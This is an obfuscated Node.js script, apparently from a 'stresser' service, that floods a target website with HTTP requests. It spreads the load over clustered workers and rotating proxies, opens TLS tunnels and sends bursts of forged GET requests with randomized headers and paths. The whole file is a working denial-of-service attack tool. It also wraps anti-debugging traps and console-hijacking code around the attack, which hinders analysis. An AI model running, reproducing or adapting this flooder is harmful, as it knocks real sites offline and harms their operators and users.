var _0x458687 = (function () {
  var _0x4ce544 = true
  return function (_0x46ee2a, _0x3c34bb) {
    var _0x41194b = _0x4ce544
      ? function () {
          if (_0x3c34bb) {
            var _0x4b2132 = _0x3c34bb.apply(_0x46ee2a, arguments)
            return (_0x3c34bb = null), _0x4b2132
          }
        }
      : function () {}
    return (_0x4ce544 = false), _0x41194b
  }
})()
var _0x56dc85 = _0x458687(this, function () {
  return _0x56dc85
    .toString()
    .search('(((.+)+)+)+$')
    .toString()
    .constructor(_0x56dc85)
    .search('(((.+)+)+)+$')
})
_0x56dc85()
var _0x4ef39a = (function () {
  var _0x4ce056 = true
  return function (_0x29af09, _0x3b0a3b) {
    var _0x2df5fd = _0x4ce056
      ? function () {
          if (_0x3b0a3b) {
            var _0x2731b3 = _0x3b0a3b.apply(_0x29af09, arguments)
            return (_0x3b0a3b = null), _0x2731b3
          }
        }
      : function () {}
    return (_0x4ce056 = false), _0x2df5fd
  }
})()
;(function () {
  _0x4ef39a(this, function () {
    var _0x3e732f = new RegExp('function *\\( *\\)'),
      _0x308cea = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x3994aa = _0x232a9e('init')
    if (
      !_0x3e732f.test(_0x3994aa + 'chain') ||
      !_0x308cea.test(_0x3994aa + 'input')
    ) {
      _0x3994aa('0')
    } else {
      _0x232a9e()
    }
  })()
})()
;(function () {
  var _0x9a69f4
  try {
    var _0x5497ae = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x9a69f4 = _0x5497ae()
  } catch (_0xba082a) {
    _0x9a69f4 = window
  }
  _0x9a69f4.setInterval(_0x232a9e, 4000)
})()
var _0x325c83 = (function () {
    var _0x2ce9da = true
    return function (_0x3083a9, _0xf3efca) {
      var _0x5138a4 = _0x2ce9da
        ? function () {
            if (_0xf3efca) {
              var _0x319075 = _0xf3efca.apply(_0x3083a9, arguments)
              return (_0xf3efca = null), _0x319075
            }
          }
        : function () {}
      return (_0x2ce9da = false), _0x5138a4
    }
  })(),
  _0x3fa659 = _0x325c83(this, function () {
    var _0x11c935 = function () {
      var _0x271aec
      try {
        _0x271aec = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x198eca) {
        _0x271aec = window
      }
      return _0x271aec
    }
    var _0x24fd0a = _0x11c935()
    var _0x192190 = (_0x24fd0a.console = _0x24fd0a.console || {}),
      _0x53459e = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (var _0x268920 = 0; _0x268920 < _0x53459e.length; _0x268920++) {
      var _0x52a7cc = _0x325c83.constructor.prototype.bind(_0x325c83)
      var _0x1664bb = _0x53459e[_0x268920]
      var _0x177aef = _0x192190[_0x1664bb] || _0x52a7cc
      _0x52a7cc['__proto__'] = _0x325c83.bind(_0x325c83)
      _0x52a7cc.toString = _0x177aef.toString.bind(_0x177aef)
      _0x192190[_0x1664bb] = _0x52a7cc
    }
  })
_0x3fa659()
const url = require('url'),
  fs = require('fs'),
  { constants } = require('crypto'),
  http = require('http'),
  tls = require('tls'),
  request = require('request'),
  cluster = require('cluster'),
  path = require('path'),
  ignoreNames = [
    'RequestError',
    'StatusCodeError',
    'CaptchaError',
    'CloudflareError',
    'ParseError',
    'ParserError',
  ],
  ignoreCodes = [
    'SELF_SIGNED_CERT_IN_CHAIN',
    'ECONNRESET',
    'ERR_ASSERTION',
    'ECONNREFUSED',
    'EPIPE',
    'EHOSTUNREACH',
    'ETIMEDOUT',
    'ESOCKETTIMEDOUT',
    'EPROTO',
  ]
process
  .on('uncaughtException', function (_0x4221bd) {
    if (
      (_0x4221bd.code && ignoreCodes.includes(_0x4221bd.code)) ||
      (_0x4221bd.name && ignoreNames.includes(_0x4221bd.name))
    ) {
      return false
    }
  })
  .on('unhandledRejection', function (_0x15fc5c) {
    if (
      (_0x15fc5c.code && ignoreCodes.includes(_0x15fc5c.code)) ||
      (_0x15fc5c.name && ignoreNames.includes(_0x15fc5c.name))
    ) {
      return false
    }
  })
  .on('warning', (_0x201816) => {
    if (
      (_0x201816.code && ignoreCodes.includes(_0x201816.code)) ||
      (_0x201816.name && ignoreNames.includes(_0x201816.name))
    ) {
      return false
    }
  })
  .setMaxListeners(0)
process.argv.length < 10 &&
  (console.log(
    'use : node ' +
      path.basename(__filename) +
      ' url time threads method httpversion ref-list ua-list proxy-list'
  ),
  console.log('Create For Stressid.ru @MSIDSTRESS'),
  process.exit(-1))
const target = process.argv[2],
  time = process.argv[3],
  threads = process.argv[4],
  method = process.argv[5],
  httpversion = process.argv[6],
  reflist = process.argv[7],
  ualist = process.argv[8],
  proxylist = process.argv[9],
  referers = fs.readFileSync(reflist, 'utf-8').split('\n'),
  useragents = fs.readFileSync(ualist, 'utf-8').split('\n'),
  proxis = fs.readFileSync(proxylist, 'utf-8').toString().match(/\S+/g),
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
  ],
  encoding_header = ['deflate, gzip;q=1.0, *;q=0.5', 'gzip, deflate, br', '*'],
  controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
  ]
function proxys() {
  return proxis[Math.floor(Math.random() * proxis.length)]
}
function referering() {
  return referers[Math.floor(Math.random() * referers.length)]
}
function useragent() {
  return useragents[Math.floor(Math.random() * useragents.length)]
}
function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)]
}
function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)]
}
function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)]
}
function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)]
}
setTimeout(() => {
  process.exit(-1)
}, time * 1000)
function RandomString(_0x6bdc5b) {
  var _0x2c3405 = ''
  var _0x405424 =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  var _0x227b2f = _0x405424.length
  for (var _0x162365 = 0; _0x162365 < _0x6bdc5b; _0x162365++) {
    _0x2c3405 += _0x405424.charAt(Math.floor(Math.random() * _0x227b2f))
  }
  return _0x2c3405
}
if (cluster.isMaster) {
  for (let z = 0; z < threads; z++) {
    cluster.fork().send({})
  }
} else {
  var parsed = url.parse(target),
    cookie = request.jar()
  function BuildRequest() {
    let _0x2f6d42 = parsed.path
    _0x2f6d42.indexOf('[rand]') !== -1 &&
      (_0x2f6d42 = _0x2f6d42.replace(/\[rand\]/g, RandomString(14)))
    var _0x218127 =
      'GET ' +
      _0x2f6d42 +
      ' ' +
      httpversion +
      '\r\nHost: ' +
      parsed.host +
      '\r\nReferer: ' +
      referering() +
      '\r\nCookie: ' +
      cookie +
      '\r\nAccept: ' +
      accept() +
      '\r\nuser-agent: ' +
      useragent() +
      '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ' +
      encoding() +
      '\r\nAccept-Language: ' +
      lang() +
      '\r\nContent-Language: ' +
      lang() +
      '\r\nCache-Control: ' +
      controling() +
      '\r\nConnection: Keep-Alive\r\n\r\n'
    return _0x218127
  }
  setInterval(function () {
    var _0x4f8f17 = proxys()
    _0x4f8f17 = _0x4f8f17.split(':')
    var _0x522beb = {
      keepAlive: true,
      keepAliveMsecs: 50000,
      maxSockets: Infinity,
    }
    const _0xd47cd9 = new http.Agent(_0x522beb)
    var _0x240fa6 = {
      Host: parsed.host,
      Connection: 'Keep-Alive',
    }
    _0x240fa6['Proxy-Connection'] = 'Keep-Alive'
    var _0xf5bf19 = http.request(
      {
        host: _0x4f8f17[0],
        agent: _0xd47cd9,
        globalAgent: _0xd47cd9,
        port: _0x4f8f17[1],
        headers: _0x240fa6,
        method: 'CONNECT',
        path: parsed.host + ':443',
      },
      function () {
        _0xf5bf19.setSocketKeepAlive(true)
      }
    )
    _0xf5bf19
      .on('connect', function (_0x269a07, _0x28552a, _0x213aa2) {
        tls.authorized = true
        tls.sync = true
        var _0x3be35c = tls.connect(
          {
            ciphers:
              'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
            secureProtocol: [
              'TLSv1_2_method',
              'TLSv1_3_method',
              'SSL_OP_NO_SSLv3',
              'SSL_OP_NO_SSLv2',
              'TLS_OP_NO_TLS_1_1',
              'TLS_OP_NO_TLS_1_0',
            ],
            honorCipherOrder: true,
            requestCert: true,
            host: parsed.host,
            port: 80,
            secureOptions:
              constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
            servername: parsed.host,
            secure: true,
            rejectUnauthorized: false,
            socket: _0x28552a,
          },
          function () {
            for (let _0x3be4f5 = 0; _0x3be4f5 < 64; _0x3be4f5++) {
              _0x3be35c.setKeepAlive(true, 10000)
              _0x3be35c.setTimeout(10000)
              var _0x11f8f9 = BuildRequest()
              _0x3be35c.write(_0x11f8f9)
            }
          }
        )
        _0x3be35c.on('disconnected', () => {
          _0x3be35c.destroy()
        })
        _0x3be35c.on('timeout', () => {
          _0x3be35c.destroy()
        })
        _0x3be35c.on('error', (_0x121f29) => {
          _0x3be35c.destroy()
        })
        _0x3be35c.on('data', (_0x307b43) => {
          setTimeout(function () {
            return _0x3be35c.destroy(), delete _0x3be35c
          }, 10000)
        })
        _0x3be35c.on('end', () => {
          _0x3be35c.destroy()
        })
      })
      .end()
  }, 0)
}
function _0x232a9e(_0x700d2e) {
  function _0x4ceff3(_0x5694a8) {
    if (typeof _0x5694a8 === 'string') {
      return function (_0x23db5e) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x5694a8 / _0x5694a8).length !== 1 || _0x5694a8 % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x4ceff3(++_0x5694a8)
  }
  try {
    if (_0x700d2e) {
      return _0x4ceff3
    } else {
      _0x4ceff3(0)
    }
  } catch (_0x7c910c) {}
}
